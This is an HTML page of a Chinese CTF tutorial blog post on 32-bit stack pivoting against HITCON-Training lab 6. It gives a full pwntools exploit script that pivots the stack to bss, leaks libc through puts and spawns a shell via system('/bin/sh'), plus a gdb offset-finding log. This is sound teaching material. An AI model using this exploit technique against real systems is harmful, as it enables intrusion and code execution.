@@ -1,0 +1,347 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PWN入门（2-2-1）-栈迁移（x86） | Cyberangel's Blog</title><meta name="author" content="Cyberangel"><meta name="copyright" content="Cyberangel"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="PWN入门（2-2-1）-栈迁移（x86） 附件下载：链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1thyRHW_5nhZpmUnlM-i-nw提取码：8s7l题目来源：HITCON-Training-master的lab 6参考资料：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_38154820&#x2F;article&#x2F;details&#x2F;106330238htt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN入门（2-2-1）-栈迁移（x86）">
+<meta property="og:url" content="https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%882-2-1%EF%BC%89-%E6%A0%88%E8%BF%81%E7%A7%BB%EF%BC%88x86%EF%BC%89/index.html">
+<meta property="og:site_name" content="Cyberangel&#39;s Blog">
+<meta property="og:description" content="PWN入门（2-2-1）-栈迁移（x86） 附件下载：链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1thyRHW_5nhZpmUnlM-i-nw提取码：8s7l题目来源：HITCON-Training-master的lab 6参考资料：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_38154820&#x2F;article&#x2F;details&#x2F;106330238htt">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picsum.photos/seed/blog-cover-08/800/450">
+<meta property="article:published_time" content="2020-08-16T03:24:29.000Z">
+<meta property="article:modified_time" content="2026-07-03T14:46:15.769Z">
+<meta property="article:author" content="Cyberangel">
+<meta property="article:tag" content="二进制安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://picsum.photos/seed/blog-cover-08/800/450"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "PWN入门（2-2-1）-栈迁移（x86）",
+  "url": "https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%882-2-1%EF%BC%89-%E6%A0%88%E8%BF%81%E7%A7%BB%EF%BC%88x86%EF%BC%89/",
+  "image": "https://picsum.photos/seed/blog-cover-08/800/450",
+  "datePublished": "2020-08-16T03:24:29.000Z",
+  "dateModified": "2026-07-03T14:46:15.769Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Cyberangel",
+      "url": "https://elydemiurge.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%882-2-1%EF%BC%89-%E6%A0%88%E8%BF%81%E7%A7%BB%EF%BC%88x86%EF%BC%89/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.5"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.2.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
+          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')
+
+          if (theme === undefined) {
+            if (mediaQueryLight.matches) activateLightMode()
+            else if (mediaQueryDark.matches) activateDarkMode()
+            else {
+              const hour = new Date().getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            mediaQueryDark.addEventListener('change', () => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else {
+            theme === 'light' ? activateLightMode() : activateDarkMode()
+          }
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'PWN入门（2-2-1）-栈迁移（x86）',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="Cyberangel's Blog" type="application/atom+xml">
+</head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+btf.addGlobalFn('pjaxSend', () => {
+  Pace.restart()
+}, 'pace_restart')
+
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">467</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(https://picsum.photos/seed/blog-cover-08/800/450);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Cyberangel's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">PWN入门（2-2-1）-栈迁移（x86）</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">PWN入门（2-2-1）-栈迁移（x86）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-08-16T03:24:29.000Z" title="发表于 2020-08-16 11:24:29">2020-08-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-07-03T14:46:15.769Z" title="更新于 2026-07-03 22:46:15">2026-07-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/">公开知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">2.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>10分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="PWN入门（2-2-1）-栈迁移（x86）"><a href="#PWN入门（2-2-1）-栈迁移（x86）" class="headerlink" title="PWN入门（2-2-1）-栈迁移（x86）"></a>PWN入门（2-2-1）-栈迁移（x86）</h1><blockquote>
+<p>附件下载：<br>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1thyRHW_5nhZpmUnlM-i-nw">https://pan.baidu.com/s/1thyRHW_5nhZpmUnlM-i-nw</a><br>提取码：8s7l<br>题目来源：HITCON-Training-master的lab 6<br>参考资料：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/106330238">https://blog.csdn.net/qq_38154820&#x2F;article&#x2F;details&#x2F;106330238</a><br><a target="_blank" rel="noopener" href="https://www.yuque.com/brooke-ygfso/mhpnug/lcfyf0#VAWnD">https://www.yuque.com/brooke-ygfso/mhpnug/lcfyf0#VAWnD</a><br>感谢**<span style="color: #F5222D">@ILIB</span>****<span style="color: #F5222D">师傅</span>**的指点</p>
+</blockquote>
+<hr>
+<p><strong><span style="color: #DF2A3F">2023年05月21日 23:45更新：</span></strong></p>
+<p><strong><span style="color: #DF2A3F">我学弟在栈迁移的时候会出现调用puts函数后程序崩溃的问题，这可能因为：</span></strong></p>
+<p><img src="/assets/posts/pwn-2-2-1-x86-1nm90/assets/1684683986066-863a5624-2c37-497b-8ac4-31aed3e3c565.png" alt="image.png"></p>
+<p><strong><span style="color: #DF2A3F">而且，不仅got表可能会被修改，IO指针也会受到影响，因为他们就在bank的上方，这也会导致程序的崩溃，如下图所示：</span></strong></p>
+<p><img src="/assets/posts/pwn-2-2-1-x86-1nm90/assets/1684684243806-25d72c33-cb6b-46be-add4-e0dba1a1ea0e.png" alt="image.png"></p>
+<p><strong><span style="color: #DF2A3F">上图中的bank指的是全局变量，感兴趣的看看</span><span style="color: #DF2A3F"><code>GYTF2020_borrowstack</code></span><span style="color: #DF2A3F">这道题。</span></strong></p>
+<hr>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次来了解一下栈迁移的技术，它分为32位和64位ELF，我们先来学习32位栈迁移</p>
+<p>明确一个观点，<strong><span style="color: #F5222D">栈的内容即程序EIP执行的流程（因为我们总是覆盖函数的返回地址）</span></strong></p>
+<p>**<span style="color: #F5222D">栈中的内容都是</span>**栈：函数 返回地址 参数</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>栈迁移正如它所描述的，该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。我们可利用该技巧**<span style="color: #F5222D">来解决栈溢出空间大小不足的问题</span>**。</p>
+<p>我们进入某一个函数的时候，会执行call指令</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call <span class="title function_">func</span><span class="params">()</span>;    <span class="comment">//push eip+4;  push ebp;   mov ebp,esp;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>call指令，先将返回地址（EIP+4）进行push，然后jmp func的地址，最后执行push ebp;   mov ebp,esp;</p>
+</blockquote>
+<p>call func() 执行完要退出的时候要进行与call func相反的操作（恢复现场）维持栈平衡！</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. leave;          //mov esp,ebp;  pop ebp;</span><br><span class="line"><span class="number">2</span>. ret ;           // pop eip</span><br></pre></td></tr></table></figure>
+
+<p>栈迁移的核心思想就是：将栈 的  esp 和 ebp 转移到一个“输入不受长度限制的且可控制”的地址处，通常是 bss 段地址！在最后ret 的时候  如果我们能够控制得 了栈顶 esp指向的地址就相当于控制了程序执行流！</p>
+<blockquote>
+<p>这里有个很好的描述，建议大家可以去看下：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/yuanyunfeng3/article/details/51456049">https://blog.csdn.net/yuanyunfeng3/article/details/51456049</a></p>
+</blockquote>
+<h2 id="32位程序-栈迁移"><a href="#32位程序-栈迁移" class="headerlink" title="32位程序 栈迁移"></a>32位程序 栈迁移</h2><p>先把完整的脚本放出来，再慢慢解释：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p=<span class="keyword">process</span>(<span class="string">&#x27;./migration&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./migration&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib32/libc.so.6&#x27;</span>)<span class="comment">#本地libc文件</span></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span>  </span><br><span class="line"></span><br><span class="line">buf=elf.bss()+<span class="number">0</span>x500</span><br><span class="line">buf1=elf.bss()+<span class="number">0</span>x400</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">leave_ret=<span class="number">0</span>x08048418</span><br><span class="line"><span class="comment"># 0x08048418 : leave ; ret</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0</span>x28)+p32(buf)+p32(read_plt)+p32(leave_ret)+p32(<span class="number">0</span>)+p32(buf)+p32(<span class="number">0</span>x100)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Try your best :\n&#x27;</span>,payload1)</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop1ret=<span class="number">0</span>x0804836d</span><br><span class="line"><span class="comment"># 0x0804836d : pop ebx ; ret</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload2=p32(buf1)+p32(puts_plt)+p32(pop1ret)+p32(puts_got)</span><br><span class="line">payload2+=p32(read_plt)+p32(leave_ret)+p32(<span class="number">0</span>)+p32(buf1)+p32(<span class="number">0</span>x100)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">puts_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">success(<span class="string">&quot;puts_addr = &quot;</span>+hex(puts_addr))</span><br><span class="line">libcbase=puts_addr<span class="literal">-libc</span>.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr=libcbase+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop3ret=<span class="number">0</span>x08048569</span><br><span class="line"><span class="comment"># 0x08048569 : pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">payload3=p32(buf)+p32(read_plt)+p32(pop3ret)+p32(<span class="number">0</span>)+p32(buf)+p32(<span class="number">0</span>x100)</span><br><span class="line">payload3+=p32(system_addr)+p32(<span class="number">0</span>xdeadbeef)+p32(buf)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>将文件下载下来，检查文件保护：</p>
+<p><img src="/assets/posts/pwn-2-2-1-x86-1nm90/assets/1597548423248-18b632ec-3aee-4031-9659-b8fc9bc1a3aa.png" alt="QQ截图20200816112655.png"></p>
+<p>32位程序，开启了NX保护和Full RELRO，拖入到IDA里查看main函数：</p>
+<p><img src="/assets/posts/pwn-2-2-1-x86-1nm90/assets/1597548526378-2220d8ce-f143-477f-8dd1-0aba02643716.png" alt="QQ截图20200816112837.png"></p>
+<p>从题目中可以看出，main函数只给了我们一次输入的机会，也就是不能利用栈溢出来多次使用main函数。</p>
+<p>我们首先测一下buf距离EBP（栈底）的距离（IDA给的是0x28，万一不准确呢？）</p>
+<p>日志如下：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面/CTF<span class="comment"># cyclic 200</span></span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line">root@kali:~/桌面/CTF<span class="comment"># gdb migration</span></span><br><span class="line">GNU gdb (Debian <span class="number">8.2</span>.<span class="number">1</span><span class="literal">-2</span>) <span class="number">8.2</span>.<span class="number">1</span></span><br><span class="line">Copyright (C) <span class="number">2018</span> Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version <span class="number">3</span> or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line"><span class="built_in">Type</span> <span class="string">&quot;show copying&quot;</span> and <span class="string">&quot;show warranty&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">&quot;x86_64-linux-gnu&quot;</span>.</span><br><span class="line"><span class="built_in">Type</span> <span class="string">&quot;show configuration&quot;</span> <span class="keyword">for</span> configuration details.</span><br><span class="line"><span class="keyword">For</span> bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line"></span><br><span class="line"><span class="keyword">For</span> help, <span class="built_in">type</span> <span class="string">&quot;help&quot;</span>.</span><br><span class="line"><span class="built_in">Type</span> <span class="string">&quot;apropos word&quot;</span> to search <span class="keyword">for</span> commands related to <span class="string">&quot;word&quot;</span>...</span><br><span class="line">Reading symbols from migration...(no debugging symbols found)...done.</span><br><span class="line">gdb<span class="literal">-peda</span><span class="variable">$</span> run</span><br><span class="line">Starting program: /root/桌面/CTF/migration </span><br><span class="line"><span class="keyword">Try</span> your best :</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"></span><br><span class="line">[----------------------------------<span class="type">registers</span>-----------------------------------]</span><br><span class="line">EAX: <span class="number">0</span>x40 (<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">EBX: <span class="number">0</span>x0 </span><br><span class="line">ECX: <span class="number">0</span>xffffd250 (<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa\\J\375&quot;</span>, &lt;incomplete sequence \<span class="number">367</span>&gt;)</span><br><span class="line">EDX: <span class="number">0</span>x40 (<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">ESI: <span class="number">0</span>xf7fac000 <span class="literal">--</span>&gt; <span class="number">0</span>x1d9d6c </span><br><span class="line">EDI: <span class="number">0</span>xf7fac000 <span class="literal">--</span>&gt; <span class="number">0</span>x1d9d6c </span><br><span class="line"><span class="built_in">EBP</span>: <span class="number">0</span>x6161616b (<span class="string">&#x27;kaaa&#x27;</span>)</span><br><span class="line">ESP: <span class="number">0</span>xffffd280 (<span class="string">&quot;maaanaaaoaaapaaa\\J\375&quot;</span>, &lt;incomplete sequence \<span class="number">367</span>&gt;)</span><br><span class="line">EIP: <span class="number">0</span>x6161616c (<span class="string">&#x27;laaa&#x27;</span>)</span><br><span class="line">EFLAGS: <span class="number">0</span>x10296 (carry PARITY ADJUST zero SIGN <span class="keyword">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------<span class="type">code</span>-------------------------------------]</span><br><span class="line">Invalid <span class="variable">$PC</span> address: <span class="number">0</span>x6161616c</span><br><span class="line">[------------------------------------<span class="type">stack</span>-------------------------------------]</span><br><span class="line"><span class="number">0000</span>| <span class="number">0</span>xffffd280 (<span class="string">&quot;maaanaaaoaaapaaa\\J\375&quot;</span>, &lt;incomplete sequence \<span class="number">367</span>&gt;)</span><br><span class="line"><span class="number">0004</span>| <span class="number">0</span>xffffd284 (<span class="string">&quot;naaaoaaapaaa\\J\375&quot;</span>, &lt;incomplete sequence \<span class="number">367</span>&gt;)</span><br><span class="line"><span class="number">0008</span>| <span class="number">0</span>xffffd288 (<span class="string">&quot;oaaapaaa\\J\375&quot;</span>, &lt;incomplete sequence \<span class="number">367</span>&gt;)</span><br><span class="line"><span class="number">0012</span>| <span class="number">0</span>xffffd28c (<span class="string">&quot;paaa\\J\375&quot;</span>, &lt;incomplete sequence \<span class="number">367</span>&gt;)</span><br><span class="line"><span class="number">0016</span>| <span class="number">0</span>xffffd290 <span class="literal">--</span>&gt; <span class="number">0</span>xf7fd4a5c <span class="literal">--</span>&gt; <span class="number">0</span>x0 </span><br><span class="line"><span class="number">0020</span>| <span class="number">0</span>xffffd294 <span class="literal">--</span>&gt; <span class="number">0</span>xf7ffd000 <span class="literal">--</span>&gt; <span class="number">0</span>x28f2c </span><br><span class="line"><span class="number">0024</span>| <span class="number">0</span>xffffd298 <span class="literal">--</span>&gt; <span class="number">0</span>xf7fac000 <span class="literal">--</span>&gt; <span class="number">0</span>x1d9d6c </span><br><span class="line"><span class="number">0028</span>| <span class="number">0</span>xffffd29c <span class="literal">--</span>&gt; <span class="number">0</span>xffffffff </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, <span class="keyword">data</span>, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line"><span class="number">0</span>x6161616c <span class="keyword">in</span> ?? ()</span><br><span class="line">gdb<span class="literal">-peda</span><span class="variable">$</span> qaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line">Undefined command: <span class="string">&quot;qaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&quot;</span>.  <span class="keyword">Try</span> <span class="string">&quot;help&quot;</span>.</span><br><span class="line">gdb<span class="literal">-peda</span><span class="variable">$</span> </span><br><span class="line">[<span class="number">1</span>]+  已停止               gdb migration</span><br><span class="line">root@kali:~/桌面/CTF<span class="comment"># cyclic -l 0x6161616c</span></span><br><span class="line"><span class="number">44</span></span><br></pre></td></tr></table></figure>
+
+<p>手动测出来的栈偏移为44（0x2C），这说明变量buf距离main函数的返回地址为0x2C，那么距离EBP（栈底）的距离为（0x2C-4&#x3D;0x28&#x3D;40），看来这次IDA挺准的嘛。</p>
